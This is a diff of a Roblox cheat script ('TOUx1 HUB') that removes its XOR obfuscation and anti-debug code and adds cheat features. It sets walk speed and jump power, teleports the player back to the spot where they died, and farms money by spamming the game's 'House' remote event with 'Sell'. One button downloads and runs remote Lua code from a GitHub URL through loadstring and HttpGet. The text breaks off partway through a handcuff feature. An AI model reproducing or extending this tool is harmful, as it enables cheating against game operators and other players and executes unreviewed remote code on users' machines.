@@ -1,444 +1,832 @@
--- XOR Encryption
-local function xor(str, key)
-    local result = ""
-    for i = 1, #str do
-        result = result .. string.char(bit32.bxor(string.byte(str, i), key))
-    end
-    return result
-end
-
--- Random key per run
-math.randomseed(tick())
-local xorkey = math.random(1, 255)
-local enc = function(s) return xor(s, xorkey) end
-local dec = function(s) return xor(s, xorkey) end
-
--- Anti-debug
-local function antiDebug()
-    if debug.getinfo or getfenv or _G.TamperCheck then
-        error(dec(enc("Unauthorized access detected!")))
-    end
-end
-
--- Junk table
-local junk = {
-    _0x7a2b3c = function() return math.random(1000, 9999) end,
-    _0x9d5e6f = {data = "useless", value = math.random()},
-    _0x4g8h9i = function() for i=1,50 do math.random() end end
-}
-
 -- Dependency check
 if not _G.DependencyCheck then
-    error(dec(enc("Core components missing!")))
+    _G.DependencyCheck = {}
 end
 _G.DependencyCheck.part1 = true
 
--- Obfuscated main code
-local q9x7z2k1 = game[dec(enc("Players"))]
-local p3v8m4j6 = q9x7z2k1[dec(enc("LocalPlayer"))]
-local r2t5n9w3 = p3v8m4j6.Character or p3v8m4j6.CharacterAdded:Wait()
-local k8h4y0f2 = r2t5n9w3:WaitForChild(dec(enc("Humanoid")))
+-- Initialize player and character
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
 
-local w6j2x8m5 = Instance.new(dec(enc("ScreenGui")))
-w6j2x8m5[dec(enc("ResetOnSpawn"))] = false
-w6j2x8m5.Parent = p3v8m4j6:WaitForChild(dec(enc("PlayerGui")))
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
-local b4z7q0n1 = Instance.new(dec(enc("Frame")))
-b4z7q0n1.Size = UDim2.new(0, 500, 0, 300)
-b4z7q0n1.Position = UDim2.new(0.5, -250, 0.5, -150)
-b4z7q0n1.BackgroundColor3 = Color3.fromRGB(100,100,100)
-b4z7q0n1.BorderSizePixel = 0
-b4z7q0n1.Active = true
-b4z7q0n1.Draggable = true
-b4z7q0n1.Parent = w6j2x8m5
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 500, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
+mainFrame.BackgroundColor3 = Color3.fromRGB(100,100,100)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
 
--- Junk function
-local function fakeCalc()
-    local x = junk._0x7a2b3c()
-    for i=1,10 do x = x + math.random(1, 100) end
-    return x
-end
+-- Dragging System
+local UserInputService = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
 
-local t1m9r3v6 = game:GetService(dec(enc("UserInputService")))
-local x5k2p8j4, y7n0w3z9, q4f6t2m1, h8r4v9x3
-
-local function updateDrag(input)
-    antiDebug()
-    local delta = input.Position - q4f6t2m1
-    b4z7q0n1.Position = UDim2.new(
-        h8r4v9x3.X.Scale, h8r4v9x3.X.Offset + delta.X,
-        h8r4v9x3.Y.Scale, h8r4v9x3.Y.Offset + delta.Y
+local function updateInput(input)
+    local delta = input.Position - dragStart
+    mainFrame.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + delta.X,
+        startPos.Y.Scale, startPos.Y.Offset + delta.Y
     )
 end
 
-b4z7q0n1.InputBegan:Connect(function(input)
+mainFrame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 
     or input.UserInputType == Enum.UserInputType.Touch then
-        x5k2p8j4 = true
-        q4f6t2m1 = input.Position
-        h8r4v9x3 = b4z7q0n1.Position
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
-                x5k2p8j4 = false
+                dragging = false
             end
         end)
     end
 end)
 
-b4z7q0n1.InputChanged:Connect(function(input)
+mainFrame.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement 
     or input.UserInputType == Enum.UserInputType.Touch then
-        y7n0w3z9 = input
+        dragInput = input
     end
 end)
 
-t1m9r3v6.InputChanged:Connect(function(input)
-    if x5k2p8j4 and input == y7n0w3z9 then
-        updateDrag(input)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        updateInput(input)
     end
 end)
 
-local sidebar = Instance.new(dec(enc("Frame")))
-sidebar.Size = UDim2.new(0, 120, 1, 0)
-sidebar.BackgroundColor3 = Color3.fromRGB(80,80,80)
-sidebar.BorderSizePixel = 0
-sidebar.Parent = b4z7q0n1
+-- Sidebar
+local sideBar = Instance.new("Frame")
+sideBar.Size = UDim2.new(0, 120, 1, 0)
+sideBar.BackgroundColor3 = Color3.fromRGB(80,80,80)
+sideBar.BorderSizePixel = 0
+sideBar.Parent = mainFrame
 
-local byText = Instance.new(dec(enc("TextLabel")))
+local byText = Instance.new("TextLabel")
 byText.Size = UDim2.new(1,0,0,40)
 byText.BackgroundTransparency = 1
-byText.Text = dec(enc("by:TOU"))
+byText.Text = "by:TOU"
 byText.TextColor3 = Color3.fromRGB(255,255,255)
 byText.TextSize = 20
 byText.Font = Enum.Font.GothamBold
-byText.Parent = sidebar
+byText.Parent = sideBar
+
+-- Minimize Frame
+local minimizeFrame = Instance.new("Frame")
+minimizeFrame.Size = UDim2.new(0, 50, 0, 50)
+minimizeFrame.Position = UDim2.new(0, 10, 0, 10)
+minimizeFrame.BackgroundTransparency = 1
+minimizeFrame.Active = true
+minimizeFrame.Parent = screenGui
+minimizeFrame.Visible = false
+
+local openButton = Instance.new("ImageButton")
+openButton.Size = UDim2.new(1, 0, 1, 0)
+openButton.BackgroundTransparency = 1
+openButton.Image = "rbxassetid://106575147804507"
+openButton.Parent = minimizeFrame
+
+local minDragging, minDragInput, minDragStart, minStartPos
+
+local function minUpdateInput(input)
+    local delta = input.Position - minDragStart
+    minimizeFrame.Position = UDim2.new(
+        minStartPos.X.Scale, minStartPos.X.Offset + delta.X,
+        minStartPos.Y.Scale, minStartPos.Y.Offset + delta.Y
+    )
+end
+
+minimizeFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 
+    or input.UserInputType == Enum.UserInputType.Touch then
+        minDragging = true
+        minDragStart = input.Position
+        minStartPos = minimizeFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                minDragging = false
+            end
+        end)
+    end
+end)
+
+minimizeFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement 
+    or input.UserInputType == Enum.UserInputType.Touch then
+        minDragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if minDragging and input == minDragInput then
+        minUpdateInput(input)
+    end
+end)
 
 -- Export globals
 _G.GUIComponents = {
-    mainFrame = b4z7q0n1,
-    sidebar = sidebar,
-    homeButton = nil,
-    playerButton = nil,
-    scriptButton = nil,
-    scriptUIButton = nil,
-    contentFrame = nil
+    mainFrame = mainFrame,
+    sideBar = sideBar,
+    minimizeFrame = minimizeFrame,
+    openButton = openButton,
+    player = player,
+    character = character,
+    humanoid = humanoid
 }
--- Anti-tamper
-if tostring(_G.GUIComponents) == "nil" then error(dec(enc("Tamper detected in part1!"))) end
--- XOR and anti-debug from part1
-local function xor(str, key)
-    local result = ""
-    for i = 1, #str do
-        result = result .. string.char(bit32.bxor(string.byte(str, i), key))
-    end
-    return result
-end
-local xorkey = math.random(1, 255)
-local enc = function(s) return xor(s, xorkey) end
-local dec = function(s) return xor(s, xorkey) end
-
-local function antiDebug()
-    if debug.getinfo or getfenv then
-        error(dec(enc("Unauthorized debug attempt!")))
-    end
-end
-
 -- Dependency check
 if not _G.DependencyCheck.part1 or not _G.GUIComponents then
-    error(dec(enc("Part1 missing or corrupted!")))
+    error("Part1 missing or corrupted!")
 end
 _G.DependencyCheck.part2 = true
 
--- Junk
-local junk = {
-    _0x2b3c4d = function() return math.sin(math.random()) end,
-    _0x5e6f7g = {fake = "data", value = math.random(1, 100)}
-}
+-- Sidebar Buttons
+local homeButton = Instance.new("TextButton")
+homeButton.Size = UDim2.new(0,110,0,40)
+homeButton.Position = UDim2.new(0,5,0,50)
+homeButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+homeButton.Text = "หน้าหลัก"
+homeButton.TextColor3 = Color3.fromRGB(255,255,255)
+homeButton.TextSize = 18
+homeButton.Font = Enum.Font.Gotham
+homeButton.Parent = _G.GUIComponents.sideBar
 
--- Sidebar buttons
-local z3k9w4q2 = Instance.new(dec(enc("TextButton")))
-z3k9w4q2.Size = UDim2.new(0,110,0,40)
-z3k9w4q2.Position = UDim2.new(0,5,0,50)
-z3k9w4q2.BackgroundColor3 = Color3.fromRGB(60,60,60)
-z3k9w4q2.Text = dec(enc("หน้าหลัก"))
-z3k9w4q2.TextColor3 = Color3.fromRGB(255,255,255)
-z3k9w4q2.TextSize = 18
-z3k9w4q2.Font = Enum.Font.Gotham
-z3k9w4q2.Parent = _G.GUIComponents.sidebar
+local playerButton = Instance.new("TextButton")
+playerButton.Size = UDim2.new(0,110,0,40)
+playerButton.Position = UDim2.new(0,5,0,95)
+playerButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+playerButton.Text = "ผู้เล่น"
+playerButton.TextColor3 = Color3.fromRGB(255,255,255)
+playerButton.TextSize = 18
+playerButton.Font = Enum.Font.Gotham
+playerButton.Parent = _G.GUIComponents.sideBar
 
-local p7v2m8j4 = Instance.new(dec(enc("TextButton")))
-p7v2m8j4.Size = UDim2.new(0,110,0,40)
-p7v2m8j4.Position = UDim2.new(0,5,0,95)
-p7v2m8j4.BackgroundColor3 = Color3.fromRGB(60,60,60)
-p7v2m8j4.Text = dec(enc("ผู้เล่น"))
-p7v2m8j4.TextColor3 = Color3.fromRGB(255,255,255)
-p7v2m8j4.TextSize = 18
-p7v2m8j4.Font = Enum.Font.Gotham
-p7v2m8j4.Parent = _G.GUIComponents.sidebar
+local scriptButton = Instance.new("TextButton")
+scriptButton.Size = UDim2.new(0,110,0,40)
+scriptButton.Position = UDim2.new(0,5,0,140)
+scriptButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+scriptButton.Text = "Script"
+scriptButton.TextColor3 = Color3.fromRGB(255,255,255)
+scriptButton.TextSize = 18
+scriptButton.Font = Enum.Font.Gotham
+scriptButton.Parent = _G.GUIComponents.sideBar
 
-local t9n4r0x6 = Instance.new(dec(enc("TextButton")))
-t9n4r0x6.Size = UDim2.new(0,110,0,40)
-t9n4r0x6.Position = UDim2.new(0,5,0,140)
-t9n4r0x6.BackgroundColor3 = Color3.fromRGB(60,60,60)
-t9n4r0x6.Text = dec(enc("Script"))
-t9n4r0x6.TextColor3 = Color3.fromRGB(255,255,255)
-t9n4r0x6.TextSize = 18
-t9n4r0x6.Font = Enum.Font.Gotham
-t9n4r0x6.Parent = _G.GUIComponents.sidebar
+local scriptUIButton = Instance.new("TextButton")
+scriptUIButton.Size = UDim2.new(0,110,0,40)
+scriptUIButton.Position = UDim2.new(0,5,0,185)
+scriptUIButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+scriptUIButton.Text = "script ui"
+scriptUIButton.TextColor3 = Color3.fromRGB(255,255,255)
+scriptUIButton.TextSize = 18
+scriptUIButton.Font = Enum.Font.Gotham
+scriptUIButton.Parent = _G.GUIComponents.sideBar
 
-local w5j8q2k1 = Instance.new(dec(enc("TextButton")))
-w5j8q2k1.Size = UDim2.new(0,110,0,40)
-w5j8q2k1.Position = UDim2.new(0,5,0,185)
-w5j8q2k1.BackgroundColor3 = Color3.fromRGB(60,60,60)
-w5j8q2k1.Text = dec(enc("script ui"))
-w5j8q2k1.TextColor3 = Color3.fromRGB(255,255,255)
-w5j8q2k1.TextSize = 18
-w5j8q2k1.Font = Enum.Font.Gotham
-w5j8q2k1.Parent = _G.GUIComponents.sidebar
+local hubText = Instance.new("TextLabel")
+hubText.Size = UDim2.new(1,-120,0,40)
+hubText.Position = UDim2.new(0,120,0,0)
+hubText.BackgroundTransparency = 1
+hubText.Text = "TOUx1 HUB"
+hubText.TextColor3 = Color3.fromRGB(255,255,255)
+hubText.TextSize = 20
+hubText.Font = Enum.Font.GothamBold
+hubText.Parent = _G.GUIComponents.mainFrame
 
-local h3m9t4v7 = Instance.new(dec(enc("TextLabel")))
-h3m9t4v7.Size = UDim2.new(1,-120,0,40)
-h3m9t4v7.Position = UDim2.new(0,120,0,0)
-h3m9t4v7.BackgroundTransparency = 1
-h3m9t4v7.Text = dec(enc("TOUx1 HUB"))
-h3m9t4v7.TextColor3 = Color3.fromRGB(255,255,255)
-h3m9t4v7.TextSize = 20
-h3m9t4v7.Font = Enum.Font.GothamBold
-h3m9t4v7.Parent = _G.GUIComponents.mainFrame
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0,30,0,30)
+closeButton.Position = UDim2.new(1,-40,0,5)
+closeButton.BackgroundColor3 = Color3.fromRGB(255,0,0)
+closeButton.Text = "X"
+closeButton.TextColor3 = Color3.fromRGB(255,255,255)
+closeButton.TextSize = 20
+closeButton.Parent = _G.GUIComponents.mainFrame
 
-local q2k6y9n3 = Instance.new(dec(enc("TextButton")))
-q2k6y9n3.Size = UDim2.new(0,30,0,30)
-q2k6y9n3.Position = UDim2.new(1,-40,0,5)
-q2k6y9n3.BackgroundColor3 = Color3.fromRGB(255,0,0)
-q2k6y9n3.Text = dec(enc("X"))
-q2k6y9n3.TextColor3 = Color3.fromRGB(255,255,255)
-q2k6y9n3.TextSize = 20
-q2k6y9n3.Parent = _G.GUIComponents.mainFrame
+local contentFrame = Instance.new("Frame")
+contentFrame.Size = UDim2.new(1,-120,1,-40)
+contentFrame.Position = UDim2.new(0,120,0,40)
+contentFrame.BackgroundTransparency = 1
+contentFrame.Parent = _G.GUIComponents.mainFrame
 
-local r8v3j0m5 = Instance.new(dec(enc("Frame")))
-r8v3j0m5.Size = UDim2.new(1,-120,1,-40)
-r8v3j0m5.Position = UDim2.new(0,120,0,40)
-r8v3j0m5.BackgroundTransparency = 1
-r8v3j0m5.Parent = _G.GUIComponents.mainFrame
+-- Minimize/Close Logic
+closeButton.MouseButton1Click:Connect(function()
+    _G.GUIComponents.mainFrame.Visible = false
+    _G.GUIComponents.minimizeFrame.Visible = true
+end)
 
-_G.GUIComponents.contentFrame = r8v3j0m5
-_G.GUIComponents.homeButton = z3k9w4q2
-_G.GUIComponents.playerButton = p7v2m8j4
-_G.GUIComponents.scriptButton = t9n4r0x6
-_G.GUIComponents.scriptUIButton = w5j8q2k1
+_G.GUIComponents.openButton.MouseButton1Click:Connect(function()
+    _G.GUIComponents.minimizeFrame.Visible = false
+    _G.GUIComponents.mainFrame.Visible = true
+end)
 
--- Home page
+-- Character Update
+_G.GUIComponents.player.CharacterAdded:Connect(function(newCharacter)
+    _G.GUIComponents.character = newCharacter
+    _G.GUIComponents.humanoid = newCharacter:WaitForChild("Humanoid")
+    if contentFrame.Visible then
+        _G.PageFunctions.showHome()
+    end
+end)
+
+-- Page Functions
 local function clearContent()
-    antiDebug()
-    for _, child in pairs(r8v3j0m5:GetChildren()) do
+    for _, child in pairs(contentFrame:GetChildren()) do
         child:Destroy()
     end
 end
 
 local function showHome()
     clearContent()
-    local profileImage = Instance.new(dec(enc("ImageLabel")))
+    local profileImage = Instance.new("ImageLabel")
     profileImage.Size = UDim2.new(0,60,0,60)
     profileImage.Position = UDim2.new(0,10,0,10)
     profileImage.BackgroundTransparency = 1
-    profileImage.Image = dec(enc("rbxthumb://type=AvatarHeadShot&id="))..q9x7z2k1.LocalPlayer.UserId..dec(enc("&w=150&h=150"))
-    profileImage.Parent = r8v3j0m5
+    profileImage.Image = "rbxthumb://type=AvatarHeadShot&id=".._G.GUIComponents.player.UserId.."&w=150&h=150"
+    profileImage.Parent = contentFrame
 
-    local nameLabel = Instance.new(dec(enc("TextLabel")))
+    local nameLabel = Instance.new("TextLabel")
     nameLabel.Size = UDim2.new(1,-80,0,30)
     nameLabel.Position = UDim2.new(0,80,0,15)
     nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = dec(enc("ชื่อ: "))..q9x7z2k1.LocalPlayer.Name
+    nameLabel.Text = "ชื่อ: ".._G.GUIComponents.player.Name
     nameLabel.TextColor3 = Color3.fromRGB(255,255,255)
     nameLabel.TextSize = 18
     nameLabel.Font = Enum.Font.Gotham
     nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.Parent = r8v3j0m5
+    nameLabel.Parent = contentFrame
+
+    local ageLabel = Instance.new("TextLabel")
+    ageLabel.Size = UDim2.new(1,-80,0,30)
+    ageLabel.Position = UDim2.new(0,80,0,50)
+    ageLabel.BackgroundTransparency = 1
+    ageLabel.Text = "จำนวนวันที่สร้าง: ".._G.GUIComponents.player.AccountAge.." วัน"
+    ageLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    ageLabel.TextSize = 18
+    ageLabel.Font = Enum.Font.Gotham
+    ageLabel.TextXAlignment = Enum.TextXAlignment.Left
+    ageLabel.Parent = contentFrame
+
+    local creatorLabel = Instance.new("TextLabel")
+    creatorLabel.Size = UDim2.new(1,-20,0,50)
+    creatorLabel.Position = UDim2.new(0,10,0,90)
+    creatorLabel.BackgroundTransparency = 1
+    creatorLabel.Text = "คนสร้าง @TOUx1 สร้าง GUI , script \nคนช่วยสร้าง @wino444 สร้าง script หยิบของ"
+    creatorLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    creatorLabel.TextSize = 16
+    creatorLabel.Font = Enum.Font.Gotham
+    creatorLabel.TextXAlignment = Enum.TextXAlignment.Left
+    creatorLabel.TextYAlignment = Enum.TextYAlignment.Top
+    creatorLabel.TextWrapped = true
+    creatorLabel.Parent = contentFrame
 end
 
--- Export function
-_G.PageFunctions = _G.PageFunctions or {}
-_G.PageFunctions.showHome = showHome
-_G.PageFunctions.clearContent = clearContent
-
--- Anti-tamper
-if not _G.GUIComponents.contentFrame then
-    error(dec(enc("GUI corruption detected in part2!")))
-end
--- XOR and anti-debug
-local function xor(str, key)
-    local result = ""
-    for i = 1, #str do
-        result = result .. string.char(bit32.bxor(string.byte(str, i), key))
-    end
-    return result
-end
-local xorkey = math.random(1, 255)
-local enc = function(s) return xor(s, xorkey) end
-local dec = function(s) return xor(s, xorkey) end
-
-local function antiDebug()
-    if debug.getinfo or getfenv then
-        error(dec(enc("Debug attempt detected!")))
-    end
-end
-
--- Dependency check
-if not _G.DependencyCheck.part2 or not _G.PageFunctions then
-    error(dec(enc("Part2 missing or corrupted!")))
-end
-_G.DependencyCheck.part3 = true
-
--- Junk
-local junk = {
-    _0x8a9b0c = function() return math.cos(math.random()) end,
-    _0x1d2e3f = {fake = true, data = "nothing"}
-}
-
--- Player page
 local function showPlayer()
-    _G.PageFunctions.clearContent()
-    local speedLabel = Instance.new(dec(enc("TextLabel")))
+    clearContent()
+    local humanoid = _G.GUIComponents.humanoid
+    if not humanoid then return end
+
+    -- Speed
+    local speedLabel = Instance.new("TextLabel")
     speedLabel.Size = UDim2.new(0,150,0,30)
     speedLabel.Position = UDim2.new(0,10,0,20)
     speedLabel.BackgroundTransparency = 1
-    speedLabel.Text = dec(enc("ความเร็ว: "))..game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).WalkSpeed
+    speedLabel.Text = "ความเร็ว: "..humanoid.WalkSpeed
     speedLabel.TextColor3 = Color3.fromRGB(255,255,255)
     speedLabel.TextSize = 18
     speedLabel.Font = Enum.Font.Gotham
     speedLabel.TextXAlignment = Enum.TextXAlignment.Left
-    speedLabel.Parent = _G.GUIComponents.contentFrame
+    speedLabel.Parent = contentFrame
 
-    local speedBox = Instance.new(dec(enc("TextBox")))
+    local speedBox = Instance.new("TextBox")
     speedBox.Size = UDim2.new(0,80,0,30)
     speedBox.Position = UDim2.new(0,170,0,20)
     speedBox.BackgroundColor3 = Color3.fromRGB(128,128,128)
-    speedBox.Text = tostring(game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).WalkSpeed)
+    speedBox.Text = tostring(humanoid.WalkSpeed)
     speedBox.TextColor3 = Color3.fromRGB(255,255,255)
     speedBox.TextSize = 18
-    speedBox.Parent = _G.GUIComponents.contentFrame
+    speedBox.Parent = contentFrame
 
     speedBox.FocusLost:Connect(function(enter)
         if enter then
             local newSpeed = tonumber(speedBox.Text)
             if newSpeed and newSpeed > 0 and newSpeed <= 500 then
-                game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).WalkSpeed = newSpeed
-                speedLabel.Text = dec(enc("ความเร็ว: "))..newSpeed
+                humanoid.WalkSpeed = newSpeed
+                speedLabel.Text = "ความเร็ว: "..newSpeed
             else
-                speedBox.Text = tostring(game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).WalkSpeed)
+                speedBox.Text = tostring(humanoid.WalkSpeed)
             end
         end
     end)
 
-    local jumpLabel = Instance.new(dec(enc("TextLabel")))
+    -- Jump
+    local jumpLabel = Instance.new("TextLabel")
     jumpLabel.Size = UDim2.new(0,150,0,30)
     jumpLabel.Position = UDim2.new(0,10,0,60)
     jumpLabel.BackgroundTransparency = 1
-    jumpLabel.Text = dec(enc("กระโดด: "))..game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).JumpPower
+    jumpLabel.Text = "กระโดด: "..humanoid.JumpPower
     jumpLabel.TextColor3 = Color3.fromRGB(255,255,255)
     jumpLabel.TextSize = 18
     jumpLabel.Font = Enum.Font.Gotham
     jumpLabel.TextXAlignment = Enum.TextXAlignment.Left
-    jumpLabel.Parent = _G.GUIComponents.contentFrame
+    jumpLabel.Parent = contentFrame
 
-    local jumpBox = Instance.new(dec(enc("TextBox")))
+    local jumpBox = Instance.new("TextBox")
     jumpBox.Size = UDim2.new(0,80,0,30)
     jumpBox.Position = UDim2.new(0,170,0,60)
     jumpBox.BackgroundColor3 = Color3.fromRGB(128,128,128)
-    jumpBox.Text = tostring(game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).JumpPower)
+    jumpBox.Text = tostring(humanoid.JumpPower)
     jumpBox.TextColor3 = Color3.fromRGB(255,255,255)
     jumpBox.TextSize = 18
-    jumpBox.Parent = _G.GUIComponents.contentFrame
+    jumpBox.Parent = contentFrame
 
     jumpBox.FocusLost:Connect(function(enter)
         if enter then
             local newJump = tonumber(jumpBox.Text)
             if newJump and newJump > 0 and newJump <= 500 then
-                game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).JumpPower = newJump
-                jumpLabel.Text = dec(enc("กระโดด: "))..newJump
+                humanoid.JumpPower = newJump
+                jumpLabel.Text = "กระโดด: "..newJump
             else
-                jumpBox.Text = tostring(game.Players.LocalPlayer.Character:WaitForChild(dec(enc("Humanoid"))).JumpPower)
+                jumpBox.Text = tostring(humanoid.JumpPower)
             end
+        end
+    end)
+
+    -- Respawn at Death
+    _G.respawnAtDeathPos = _G.respawnAtDeathPos or false
+    local respawnLabel = Instance.new("TextLabel")
+    respawnLabel.Size = UDim2.new(0,150,0,30)
+    respawnLabel.Position = UDim2.new(0,10,0,100)
+    respawnLabel.BackgroundTransparency = 1
+    respawnLabel.Text = "เกิดกลับที่"
+    respawnLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    respawnLabel.TextSize = 18
+    respawnLabel.Font = Enum.Font.Gotham
+    respawnLabel.TextXAlignment = Enum.TextXAlignment.Left
+    respawnLabel.Parent = contentFrame
+
+    local respawnButton = Instance.new("TextButton")
+    respawnButton.Size = UDim2.new(0,80,0,30)
+    respawnButton.Position = UDim2.new(0,170,0,100)
+    respawnButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    respawnButton.Text = _G.respawnAtDeathPos and "เปิด" or "ปิด"
+    respawnButton.TextColor3 = Color3.fromRGB(255,255,255)
+    respawnButton.TextSize = 18
+    respawnButton.Parent = contentFrame
+
+    respawnButton.MouseButton1Click:Connect(function()
+        _G.respawnAtDeathPos = not _G.respawnAtDeathPos
+        respawnButton.Text = _G.respawnAtDeathPos and "เปิด" or "ปิด"
+        if _G.respawnAtDeathPos then
+            if _G.ReviveBackConnection then _G.ReviveBackConnection:Disconnect() end
+            _G.LastDeathPos = nil
+            _G.ReviveBackConnection = _G.GUIComponents.player.CharacterAdded:Connect(function(char)
+                task.wait(0.5)
+                local hrp = char:WaitForChild("HumanoidRootPart")
+                if _G.LastDeathPos then
+                    hrp.CFrame = _G.LastDeathPos
+                end
+            end)
+            task.spawn(function()
+                while _G.GUIComponents.player.Character do
+                    local char = _G.GUIComponents.player.Character
+                    local humanoid = char:FindFirstChildOfClass("Humanoid")
+                    if humanoid and humanoid.Health <= 0 then
+                        local hrp = char:FindFirstChild("HumanoidRootPart")
+                        if hrp then
+                            _G.LastDeathPos = hrp.CFrame
+                        end
+                    end
+                    task.wait(0.2)
+                end
+            end)
+        else
+            if _G.ReviveBackConnection then
+                _G.ReviveBackConnection:Disconnect()
+                _G.ReviveBackConnection = nil
+            end
+            _G.LastDeathPos = nil
         end
     end)
 end
 
--- Script page
+-- Export
+_G.GUIComponents.contentFrame = contentFrame
+_G.GUIComponents.homeButton = homeButton
+_G.GUIComponents.playerButton = playerButton
+_G.GUIComponents.scriptButton = scriptButton
+_G.GUIComponents.scriptUIButton = scriptUIButton
+_G.GUIComponents.closeButton = closeButton
+_G.PageFunctions = {
+    clearContent = clearContent,
+    showHome = showHome,
+    showPlayer = showPlayer
+}
+-- Dependency check
+if not _G.DependencyCheck.part2 or not _G.PageFunctions then
+    error("Part2 missing or corrupted!")
+end
+_G.DependencyCheck.part3 = true
+
+-- Initialize global variables
+_G.moneyLoop = _G.moneyLoop or false
+_G.loopSpeed = _G.loopSpeed or 0.1
+_G.autoEat = _G.autoEat or false
+
+-- Script Page
 local function showScript()
     _G.PageFunctions.clearContent()
-    local pumpLabel = Instance.new(dec(enc("TextLabel")))
+
+    local pumpLabel = Instance.new("TextLabel")
     pumpLabel.Size = UDim2.new(0,100,0,30)
     pumpLabel.Position = UDim2.new(0,10,0,20)
     pumpLabel.BackgroundTransparency = 1
-    pumpLabel.Text = dec(enc("ปั้มเงิน"))
+    pumpLabel.Text = "ปั้มเงิน"
     pumpLabel.TextColor3 = Color3.fromRGB(255,255,255)
     pumpLabel.TextSize = 18
     pumpLabel.Font = Enum.Font.Gotham
     pumpLabel.TextXAlignment = Enum.TextXAlignment.Left
     pumpLabel.Parent = _G.GUIComponents.contentFrame
 
-    local toggleButton = Instance.new(dec(enc("TextButton")))
+    local toggleButton = Instance.new("TextButton")
     toggleButton.Size = UDim2.new(0,80,0,30)
     toggleButton.Position = UDim2.new(0,120,0,20)
     toggleButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
-    toggleButton.Text = dec(enc("OFF"))
+    toggleButton.Text = _G.moneyLoop and "ON" or "OFF"
     toggleButton.TextColor3 = Color3.fromRGB(255,255,255)
     toggleButton.TextSize = 18
     toggleButton.Parent = _G.GUIComponents.contentFrame
 
+    local speedBox = Instance.new("TextBox")
+    speedBox.Size = UDim2.new(0,60,0,30)
+    speedBox.Position = UDim2.new(0,210,0,20)
+    speedBox.BackgroundColor3 = Color3.fromRGB(128,128,128)
+    speedBox.Text = tostring(_G.loopSpeed)
+    speedBox.TextColor3 = Color3.fromRGB(255,255,255)
+    speedBox.TextSize = 18
+    speedBox.Parent = _G.GUIComponents.contentFrame
+
+    speedBox.FocusLost:Connect(function(enter)
+        if enter then
+            local val = tonumber(speedBox.Text)
+            if val and val > 0 then _G.loopSpeed = val else speedBox.Text = tostring(_G.loopSpeed) end
+        end
+    end)
+
     toggleButton.MouseButton1Click:Connect(function()
-        _G.AutoFarm = not _G.AutoFarm
-        toggleButton.Text = _G.AutoFarm and dec(enc("ON")) or dec(enc("OFF"))
+        _G.moneyLoop = not _G.moneyLoop
+        toggleButton.Text = _G.moneyLoop and "ON" or "OFF"
         spawn(function()
-            while _G.AutoFarm do
-                local args = {dec(enc("Sell"))}
-                game:GetService(dec(enc("ReplicatedStorage"))):WaitForChild(dec(enc("House"))):FireServer(unpack(args))
-                wait(0.1)
+            while _G.moneyLoop do
+                local args = {"Sell"}
+                game:GetService("ReplicatedStorage"):WaitForChild("House"):FireServer(unpack(args))
+                wait(_G.loopSpeed)
             end
         end)
     end)
+
+    local animLabel = Instance.new("TextLabel")
+    animLabel.Size = UDim2.new(0,120,0,30)
+    animLabel.Position = UDim2.new(0,10,0,70)
+    animLabel.BackgroundTransparency = 1
+    animLabel.Text = "อนิเมชั่น SFX"
+    animLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    animLabel.TextSize = 18
+    animLabel.Font = Enum.Font.Gotham
+    animLabel.TextXAlignment = Enum.TextXAlignment.Left
+    animLabel.Parent = _G.GUIComponents.contentFrame
+
+    local animButton = Instance.new("TextButton")
+    animButton.Size = UDim2.new(0,80,0,30)
+    animButton.Position = UDim2.new(0,140,0,70)
+    animButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    animButton.Text = "เปิด"
+    animButton.TextColor3 = Color3.fromRGB(255,255,255)
+    animButton.TextSize = 18
+    animButton.Parent = _G.GUIComponents.contentFrame
+
+    animButton.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Animation%20sfx?update="..tick()))()
+    end)
+
+    local handcuffLabel = Instance.new("TextLabel")
+    handcuffLabel.Size = UDim2.new(0,120,0,30)
+    handcuffLabel.Position = UDim2.new(0,10,0,120)
+    handcuffLabel.BackgroundTransparency = 1
